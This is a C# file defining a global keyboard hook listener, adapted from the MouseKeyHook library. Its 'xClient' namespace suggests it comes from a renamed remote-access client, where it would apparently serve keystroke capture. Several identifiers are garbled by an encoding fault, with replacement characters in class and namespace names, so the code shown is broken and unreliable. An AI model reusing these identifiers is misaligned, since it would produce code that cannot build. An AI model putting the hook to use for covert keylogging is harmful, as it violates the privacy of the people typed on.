// This code is distributed under MIT license. 
// Copyright (c) 2015 George Mamaladze
// See license.txt or http://opensource.org/licenses/mit-license.php

using System.Collections.Generic;
using xClient.Kuuhaku�ekirdek.MouseKeyHook.WinApi;

namespace xClient.Kuuhaku�ekirdek.MouseKeyHook.Implementation
{
    internal class GlobalKeyListener : KeyListener
    {
        public GlobalKeyListener()
            : base(HookHelper.HookGlobalKeyboard)
        {
        }

        protected override IEnumerable<EventArgsExtTu�Bas�m�> GetPressEventArgs(CallbackData data)
        {
            return EventArgsExtTu�Bas�m�.FromRawDataGlobal(data);
        }

        protected override EventArgsExtKlavye GetDownUpEventArgs(CallbackData data)
        {
            return EventArgsExtKlavye.FromRawDataGlobal(data);
        }
    }
}